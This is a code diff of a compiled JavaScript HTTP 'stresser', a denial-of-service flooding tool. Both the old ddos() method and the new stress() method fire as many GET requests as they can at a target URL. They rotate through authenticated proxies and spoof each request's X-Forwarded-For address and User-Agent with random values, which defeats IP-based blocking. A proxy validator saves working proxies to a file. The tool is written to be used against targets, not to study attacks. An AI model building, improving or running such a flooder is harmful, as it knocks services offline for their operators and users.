@@ -9,172 +9,118 @@ require("overpaint.js");
 const axios_1 = __importDefault(require("axios"));
 const faker_1 = require("@faker-js/faker");
 const Utils_1 = require("../utils/Utils");
-const Counter_1 = require("./Counter");
+const PacketType_1 = require("../enums/PacketType");
+const Stats_1 = require("./Stats");
+const Packet_1 = require("../types/Packet");
 class Stresser {
-    options;
     targetURL;
-    stats;
-    proxies = [];
-    get duration() {
-        return (0, Utils_1.toHumanTime)(Date.now() - this.stats.startTime, true);
-    }
-    proxyIndex = 0;
+    // ===== Agents =====
+    // private _agentIndex: number = 0;
+    // get nextAgent() {
+    //    return this.options.agents[++this._agentIndex % this.options.agents.length];
+    // }
+    // ===== Proxies =====
+    _proxyIndex = 0;
     get nextProxy() {
-        return this.proxies[++this.proxyIndex % this.proxies.length];
+        return this.options.proxies[++this._proxyIndex % this.options.proxies.length];
     }
+    // ===== Statistics =====
+    stats = new Stats_1.Stats();
+    // ===== Options =====
+    options;
+    // ===== Constructor =====
     constructor(options) {
         // set options
         this.options = options;
         // set target URL
         this.targetURL = new url_1.URL(this.options.target);
-        // import proxies
-        this.importProxies();
-        // init stats
-        this.stats = {
-            startTime: Date.now(),
-            requests: new Counter_1.Counter(),
-            pending: new Counter_1.Counter(),
-            success: new Counter_1.Counter(),
-            errors: new Counter_1.Counter(),
-        };
-        // start rendering terminal
-        if (this.options.background) {
-            this.sendDataUpdate(2);
-        }
-        else {
-            throw new Error('Not implemented yet.');
-            // this.renderTerminal(15);
-        }
-        // start stressing
-        this.ddos(0);
+        // send data updates
+        this.sendDataUpdate(this.options.updatesPerSecond || 2);
     }
-    //================================================================================================
-    sendDataUpdate(tps = 10) {
-        setInterval(() => {
-            process.send?.({
-                type: 'data',
-                data: {
-                    duration: this.duration,
-                    requests: this.stats.requests.count,
-                    pending: this.stats.pending.count,
-                    success: this.stats.success.count,
-                    errors: this.stats.errors.count
-                }
-            });
-        }, 1000 / tps);
-    }
-    //================================================================================================
-    // private renderFrame() {
-    //    console.clear();
-    //    console.log(Stresser.header, '\n');
-    //    this.logs.forEach(log => console.log(log));
-    //    if (this.options.debugMode) {
-    //       console.log(`
-    // ${("Duration:  " + this.duration)._Gray}
-    // ${("Requests:  " + this.stats.requests.count)._White}
-    // ${("Pending:   " + this.stats.pending.count)._OrangeGold}
-    // ${("Success:   " + this.stats.success.count)._GreenApple}
-    // ${("Errors:    " + this.stats.errors.count)._Red}
-    //       `.trimEnd());
-    //    } else {
-    //       console.log(`
-    // ${("Duration:  " + this.duration)._Gray}
-    // ${("Requests:  " + this.stats.requests.count)._White}
-    //       `.trimEnd());
-    //    }
-    // }
-    // public renderTerminal(fps: number = 10) {
-    //    this.renderFrame();
-    //    setInterval(() => this.renderFrame(), 1000 / fps);
-    // }
-    //================================================================================================
-    async sendRequest(returnOnSuccess = false, config = {}) {
+    // ========== Stressing ==========================================================================
+    /**
+     * Send a request to the target URL
+     * @param config The configuration to use for the request
+     * @param proxy The proxy to use for the request
+     */
+    async sendRequest(config = {}, proxy = this.nextProxy) {
         try {
+            if (this.stats.pending >= this.options.threads)
+                return false;
             this.requestSent();
-            config = {
-                ip: faker_1.faker.internet.ipv4(),
-                userAgent: faker_1.faker.internet.userAgent(),
-                proxy: this.nextProxy,
-                ...config
-            };
-            let options = {
+            var options = {
                 headers: {
-                    'X-Forwarded-For': config.ip,
-                    'User-Agent': config.userAgent,
+                    'X-Forwarded-For': faker_1.faker.internet.ipv4(),
+                    'User-Agent': faker_1.faker.internet.userAgent(),
                     'Accept': '*/*',
                     'Accept-Language': 'en-US,en;q=0.5',
                     'Accept-Encoding': 'gzip, deflate, br',
                     'Referer': this.targetURL.hostname
                 },
-                proxy: (this.options.useProxies)
-                    ? {
-                        host: config.proxy[0],
-                        port: Number(config.proxy[1])
-                    } : undefined
+                proxy: this.options.useProxies ? {
+                    protocol: 'http',
+                    host: proxy[0],
+                    port: Number(proxy[1]),
+                    auth: proxy.length === 4 ? {
+                        username: proxy[2],
+                        password: proxy[3]
+                    } : undefined,
+                } : undefined,
+                httpAgent: this.options.httpAgent,
+                ...config
             };
-            if (this.options.debugMode) {
-                const response = await axios_1.default.get(this.targetURL.href, options);
-                this.requestComplete(response.status === 200);
-                if (returnOnSuccess)
-                    return config;
-            }
-            else {
-                axios_1.default.get(this.targetURL.href, options);
-            }
+            const response = await axios_1.default.get(this.targetURL.href, options);
+            return this.requestComplete(response.status === 200);
         }
-        catch (error) {
-            this.requestComplete(false);
+        catch {
+            return this.requestComplete(false);
         }
     }
-    ddos(rps, config = {}) {
-        if (typeof rps !== "number")
-            throw new Error('Parameter "rps" must be a (positive) number.');
-        if (rps === 0) {
-            setInterval(() => this.sendRequest(false, config), 0);
-        }
-        else {
-            setInterval(() => this.sendRequest(false, config), 1000 / rps);
-        }
+    /**
+     * Stress the target URL for a specified duration
+     * @param duration The duration of the attack
+     * @param config The configuration to use for the requests
+     */
+    stress(duration, config = {}) {
+        let loop = setInterval(() => this.sendRequest(config));
+        setTimeout(() => {
+            clearInterval(loop);
+            process.send?.((0, Packet_1.Packet)(PacketType_1.PacketType.Done, undefined));
+        }, duration * 1000);
     }
-    async filterProxies(rps) {
-        if (typeof rps !== "number")
-            throw new Error('Parameter "rps" must be a (positive) number.');
-        setInterval(async () => {
-            let config = await this.sendRequest(true);
-            if (config) {
-                let proxy = config.proxy.join(':');
-                let valid_proxies = (0, Utils_1.getStatic)('valid_proxies.txt').split('\n');
-                if (valid_proxies.includes(proxy))
-                    return;
-                // this.logs.push(config.proxy.join(':')._GreenApple);
-                (0, Utils_1.addStatic)('valid_proxies.txt', proxy + '\n');
-            }
-        }, 1000 / rps);
+    // ========== Proxies =============================================================================
+    async validateProxies(proxies, timeout = 5000) {
+        // validate proxies, and get an array of results (true/false)
+        let proxy_results = await Promise.all(proxies.map(async (proxy) => await this.sendRequest({ timeout }, proxy)));
+        // filter out invalid proxies
+        let valid_proxies = proxies.filter((proxy, index) => proxy_results[index]);
+        // save valid proxies to file
+        let txt_data = valid_proxies.map(proxy => proxy.join(':')).join('\n');
+        (0, Utils_1.setStatic)('valid_proxies.txt', txt_data);
+        return valid_proxies;
     }
-    //================================================================================================
+    // ========== Statistics =========================================================================
     requestSent() {
-        this.stats.requests.inc();
-        this.stats.pending.inc();
+        this.stats.requests++;
+        this.stats.pending++;
     }
     requestComplete(success) {
         if (typeof success !== "boolean")
             throw new Error('Parameter "success" must be true or false.');
-        this.stats.pending.dec();
-        (success) ? this.stats.success.inc() : this.stats.errors.inc();
+        this.stats.pending--;
+        (success) ? this.stats.success++ : this.stats.errors++;
         return success;
     }
-    //================================================================================================
-    importProxies() {
-        if (!this.options.useProxies)
-            return;
-        this.proxies = (0, Utils_1.getStatic)(this.options?.proxyFile).split('\n').map(proxy => proxy.split(':'));
-        if (!this.proxies.length)
-            throw new Error('No proxies found. Check the file name and try again.');
+    sendDataUpdate(tps = 10) {
+        setInterval(() => {
+            process.send?.((0, Packet_1.Packet)(PacketType_1.PacketType.Data, this.stats));
+        }, 1000 / tps);
     }
 }
 exports.Stresser = Stresser;
-// process.on('unhandledRejection', (error: any) => {
-//    console.error(`Unhandled promise rejection: ${error.message}`);
-//    process.exit(1);
-// });
+['unhandledRejection', 'uncaughtException']
+    .forEach((e) => process.on(e, (error) => {
+    console.error(`${e}: ${error.message}`);
+    process.exit(1);
+}));
 //# sourceMappingURL=Stresser.js.map
